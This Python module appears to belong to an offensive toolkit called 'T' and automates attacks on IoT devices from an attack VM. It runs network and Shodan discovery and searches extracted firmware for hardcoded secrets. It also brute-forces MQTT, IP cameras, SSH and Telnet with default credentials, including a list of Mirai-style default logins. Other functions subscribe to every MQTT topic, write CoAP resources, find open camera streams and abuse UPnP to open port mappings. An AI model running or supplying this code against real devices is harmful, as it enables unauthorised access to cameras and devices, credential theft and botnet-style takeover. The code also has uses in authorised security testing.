"""
IoT device exploitation module for T.
Covers firmware extraction, protocol enumeration (MQTT/CoAP/UPnP),
IP camera access, and Shodan IoT search.
All commands execute on the attack VM via vm_bridge.
"""

from typing import AsyncIterator
from offensive.vm_bridge import vm
from core.logger import get_logger

log = get_logger("devices.iot")


# ─── Discovery ────────────────────────────────────────────────────────────────

async def scan_network(subnet: str) -> AsyncIterator[str]:
    """Fast discovery of IoT devices on the LAN."""
    cmd = (
        f"nmap -sV -T4 --open "
        f"-p 23,80,443,554,1883,5683,8080,8443,8883,9000,49152 "
        f"--script 'http-title,banner,rtsp-url-brute' "
        f"{subnet}"
    )
    async for line in vm.run(cmd, timeout=180):
        yield line


async def shodan_iot(query: str) -> AsyncIterator[str]:
    """Search Shodan for IoT devices matching a query."""
    cmd = f"shodan search --fields ip_str,port,org,product '{query}' 2>/dev/null | head -40"
    async for line in vm.run(cmd, timeout=30):
        yield line


# ─── Firmware ─────────────────────────────────────────────────────────────────

async def firmware_extract(firmware_path: str, out_dir: str = "/tmp/firmware_out") -> AsyncIterator[str]:
    """Extract and analyse firmware with binwalk."""
    cmd = f"binwalk -e --run-as=root -C {out_dir} '{firmware_path}' 2>&1"
    async for line in vm.run(cmd, timeout=300):
        yield line


async def firmware_find_secrets(firmware_path: str) -> AsyncIterator[str]:
    """
    Extract firmware then search for:
    passwords, private keys, hardcoded creds, API keys.
    """
    out_dir = "/tmp/fw_secrets"
    patterns = "password|passwd|secret|api_key|private_key|BEGIN RSA|token|auth"
    cmd = (
        f"binwalk -e --run-as=root -C {out_dir} '{firmware_path}' -q 2>/dev/null ; "
        f"grep -rEi '{patterns}' {out_dir}/ 2>/dev/null | head -80"
    )
    async for line in vm.run(cmd, timeout=300):
        yield line


async def firmware_strings(firmware_path: str, min_len: int = 10) -> AsyncIterator[str]:
    """Extract printable strings from firmware binary."""
    cmd = f"strings -n {min_len} '{firmware_path}' | grep -iE 'pass|key|secret|admin|user|login|192\\.168|10\\.0'"
    async for line in vm.run(cmd, timeout=30):
        yield line


# ─── MQTT ─────────────────────────────────────────────────────────────────────

async def mqtt_discover(broker: str, port: int = 1883) -> AsyncIterator[str]:
    """Subscribe to all MQTT topics on a broker (no auth)."""
    cmd = f"timeout 15 mosquitto_sub -h {broker} -p {port} -t '#' -v 2>&1"
    async for line in vm.run(cmd, timeout=20):
        yield line


async def mqtt_publish(broker: str, topic: str, payload: str, port: int = 1883) -> AsyncIterator[str]:
    """Publish a message to an MQTT topic."""
    cmd = f"mosquitto_pub -h {broker} -p {port} -t '{topic}' -m '{payload}'"
    async for line in vm.run(cmd, timeout=10):
        yield line


async def mqtt_brute_auth(broker: str, port: int = 8883) -> AsyncIterator[str]:
    """Try common MQTT credentials."""
    creds = [
        ("admin", "admin"), ("admin", "password"), ("mqtt", "mqtt"),
        ("user", "user"), ("root", "root"), ("guest", "guest"),
    ]
    for user, passwd in creds:
        cmd = (
            f"timeout 5 mosquitto_sub -h {broker} -p {port} "
            f"-u '{user}' -P '{passwd}' -t '#' -C 1 2>&1"
        )
        yield f"[trying] {user}:{passwd}"
        async for line in vm.run(cmd, timeout=8):
            if "Error" not in line and line.strip():
                yield f"[HIT] {user}:{passwd} — {line}"


# ─── CoAP ─────────────────────────────────────────────────────────────────────

async def coap_discover(target: str) -> AsyncIterator[str]:
    """CoAP resource discovery (RFC 6690)."""
    cmd = f"coap-client -m get 'coap://{target}/.well-known/core' 2>&1"
    async for line in vm.run(cmd, timeout=15):
        yield line


async def coap_get(target: str, path: str) -> AsyncIterator[str]:
    """Read a CoAP resource."""
    cmd = f"coap-client -m get 'coap://{target}{path}' 2>&1"
    async for line in vm.run(cmd, timeout=10):
        yield line


async def coap_put(target: str, path: str, payload: str) -> AsyncIterator[str]:
    """Write a CoAP resource."""
    cmd = f"coap-client -m put -e '{payload}' 'coap://{target}{path}' 2>&1"
    async for line in vm.run(cmd, timeout=10):
        yield line


# ─── IP Cameras ───────────────────────────────────────────────────────────────

CAMERA_PATHS = [
    "/video", "/mjpeg", "/mjpg/video.mjpg", "/cgi-bin/mjpg/video.cgi",
    "/axis-cgi/mjpg/video.cgi", "/videostream.asf", "/image/jpeg.cgi",
    "/cam/realmonitor", "/Streaming/Channels/1", "/stream",
]

RTSP_PATHS = [
    "/", "/live", "/stream", "/h264/ch1/main/av_stream",
    "/cam/realmonitor?channel=1&subtype=0",
    "/Streaming/Channels/101",
]


async def camera_scan(target: str) -> AsyncIterator[str]:
    """Scan for open IP camera streams (HTTP MJPEG + RTSP)."""
    # HTTP streams
    for path in CAMERA_PATHS:
        cmd = f"curl -sk --connect-timeout 3 -o /dev/null -w '%{{http_code}} %{{content_type}}' http://{target}{path}"
        yield f"[http] {path}"
        async for line in vm.run(cmd, timeout=6):
            if line.strip().startswith("200"):
                yield f"  → OPEN STREAM: http://{target}{path}"

    # RTSP streams
    for path in RTSP_PATHS:
        url = f"rtsp://{target}:554{path}"
        cmd = f"ffprobe -v quiet -print_format json -show_streams '{url}' 2>&1 | head -5"
        yield f"[rtsp] {path}"
        async for line in vm.run(cmd, timeout=8):
            if "Stream" in line or "codec" in line:
                yield f"  → RTSP STREAM: {url}"


async def camera_brute(target: str, port: int = 80) -> AsyncIterator[str]:
    """Try default camera credentials."""
    cam_creds = [
        ("admin", ""), ("admin", "admin"), ("admin", "12345"),
        ("admin", "123456"), ("root", ""), ("root", "root"),
        ("admin", "password"), ("supervisor", "supervisor"),
        ("user", "user"), ("guest", "guest"),
    ]
    for user, passwd in cam_creds:
        for path in ["/", "/login.html", "/admin/"]:
            cmd = (
                f"curl -sk --connect-timeout 3 -o /dev/null -w '%{{http_code}}' "
                f"-u '{user}:{passwd}' http://{target}:{port}{path}"
            )
            yield f"[trying] {user}:{passwd} on {path}"
            async for line in vm.run(cmd, timeout=6):
                if line.strip() == "200":
                    yield f"  → ACCESS GRANTED: {user}:{passwd}"


# ─── UPnP ─────────────────────────────────────────────────────────────────────

async def upnp_discover(target: str) -> AsyncIterator[str]:
    """UPnP discovery and service enumeration."""
    cmd = f"nmap -sU -p 1900 --script upnp-info,upnp-devinfo {target}"
    async for line in vm.run(cmd, timeout=60):
        yield line


async def upnp_port_forward(target: str, ext_port: int, int_ip: str,
                             int_port: int, desc: str = "T") -> AsyncIterator[str]:
    """Abuse UPnP to add an arbitrary port mapping."""
    cmd = (
        f"upnpc -a {int_ip} {int_port} {ext_port} TCP '{desc}' 2>&1"
    )
    async for line in vm.run(cmd, timeout=15):
        yield line


# ─── Default credential scan ──────────────────────────────────────────────────

async def iot_default_creds(target: str) -> AsyncIterator[str]:
    """Try Mirai-style default credentials via Hydra (SSH + Telnet + HTTP)."""
    mirai_creds = [
        ("root", "xc3511"), ("root", "vizxv"), ("root", "admin"),
        ("admin", "admin"), ("root", "888888"), ("root", "xmhdipc"),
        ("root", "default"), ("root", "juantech"), ("root", "123456"),
        ("root", "54321"), ("support", "support"), ("root", ""),
        ("admin", "password"), ("root", "root"), ("admin", ""),
        ("admin", "1111111"), ("admin", "1234"), ("root", "12345"),
        ("user", "user"), ("root", "pass"), ("admin", "smcadmin"),
    ]
    # Write cred file on VM and run hydra against SSH + Telnet
    cred_str = "\\n".join(f"{u}:{p}" for u, p in mirai_creds)
    cmd = (
        f"printf '{cred_str}\\n' > /tmp/mirai_creds.txt && "
        f"hydra -C /tmp/mirai_creds.txt ssh://{target} -t 4 -q 2>/dev/null ; "
        f"hydra -C /tmp/mirai_creds.txt telnet://{target} -t 4 -q 2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=120):
        yield line


# ─── Full IoT audit ───────────────────────────────────────────────────────────

async def full_audit(target: str) -> AsyncIterator[str]:
    """One-shot IoT device audit."""
    yield f"[T] Starting IoT audit on {target}"
    yield "─" * 50

    yield "[1/4] Port and service discovery..."
    async for line in scan_network(target):
        yield line

    yield "\n[2/4] Default credential brute force..."
    async for line in iot_default_creds(target):
        yield line

    yield "\n[3/4] Camera stream detection..."
    async for line in camera_scan(target):
        yield line

    yield "\n[4/4] UPnP enumeration..."
    async for line in upnp_discover(target):
        yield line

    yield "\n[T] IoT audit complete."
